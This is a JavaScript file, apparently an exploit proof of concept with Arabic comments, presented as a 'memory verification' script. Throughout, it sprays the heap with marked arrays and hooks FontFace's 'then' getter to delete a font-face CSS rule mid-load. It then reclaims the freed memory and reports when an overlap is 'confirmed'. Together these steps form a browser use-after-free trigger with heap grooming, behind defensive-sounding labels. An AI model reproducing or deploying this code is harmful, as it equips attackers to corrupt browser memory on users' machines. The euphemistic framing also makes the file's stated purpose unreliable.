/**
 * [MONITORING ENVIRONMENT] - Overlap & Memory Verification Script
 * الملف: inject.js
 * الوظيفة: فحص الكائنات المحجوزة بعد الـ Free للتأكد من حدوث التداخل في الذاكرة
 */

// إشعار بدء التشغيل
ssa("[*] تم تحميل سكريبت التحقق ومراقبة تداخل كتل الذاكرة...");

function runMemoryVerification() {
    try {
        ssa("[*] بدء الفحص: تهيئة مصفوفات المراقبة الأساسية...");
        
        // مصفوفة لتخزين المراجع لغرض فحصها لاحقاً
        let checkTargetPool = [];
        
        // 1. تهيئة الـ Heap بكائنات تتبع ثابتة
        for (let i = 0; i < 50; i++) {
            let trackedArray = [1.1, 2.2, 3.3, 4.4];
            trackedArray.trackingId = 0x1000 + i;
            trackedArray.verificationMarker = 0xAAAA;
            checkTargetPool.push(trackedArray);
        }

        // 2. إعداد قاعدة عنصر النمط (Style Element)
        const vStyle = document.createElement('style');
        vStyle.id = 'verification_style';
        vStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(vStyle);

        // 3. إنشاء كائن الخط
        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let triggered = false;

        // 4. اعتراض الـ Thenable Getter وإثارة التحرير
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!triggered && this === testFace) {
                    triggered = true;
                    ssa("[!!] [RACE_HIT] معالج التزامن نشط الآن.");

                    // أ: التحرير (Free)
                    document.getElementById('verification_style').sheet.deleteRule(0);

                    // ب: فرض إعادة الحساب للتأكد من تفعيل التحرير في الـ Heap
                    let layoutFlush = document.body.offsetTop;

                    // ج: محاولة حجز كائنات جديدة بهيكل مختلف لمحاولة ملء الفراغ
                    for (let k = 0; k < 40; k++) {
                        let fillArray = [5.5, 6.6, 7.7];
                        fillArray.marker = 0xBBBB;
                    }
                }
                return undefined;
            }
        });

        // 5. إطلاق الدالة لبدء الدورة المنطقية
        document.fonts.load('1em x', 'AB');

        // 6. مرحلة التحقق (Verification Phase)
        // ننتظر قليلاً لضمان اكتمال العمليات الخلفية للمتصفح ثم نفحص القيم
        setTimeout(() => {
            ssa("[*] بدء مرحلة فحص سلامة وتداخل مصفوفات المراقبة...");
            
            let overlapDetected = false;
            
            for (let m = 0; m < checkTargetPool.length; m++) {
                // فحص ما إذا كانت الخصائص الثابتة قد تغيرت قيمتها نتيجة التحرير والتداخل
                if (checkTargetPool[m].verificationMarker !== 0xAAAA) {
                    ssa("[+] [OVERLAP_CONFIRMED] تم رصد تغير في البنية الهيكلية للمصفوفة رقم: " + m);
                    overlapDetected = true;
                    break;
                }
            }

            if (!overlapDetected) {
                ssa("[-] لم يتم رصد تغير مباشر في قيم الخصائص المفحوصة (الكائنات مستقرة مجاورة).");
            }

            ssa("[+] انتهت دورة التحقق الهيكلي بالكامل.");
        }, 200);

    } catch (e) {
        ssa("[-] خطأ أثناء فحص وتتبع الذاكرة: " + e.message);
    }
}

// ربط التفعيل بزر التشغيل الخاص بالإطار المرفوع
document.getElementById('exec-btn').addEventListener('click', function() {
    ssa("[*] تفعيل الفحص المتسلسل للذاكرة...");
    runMemoryVerification();
});
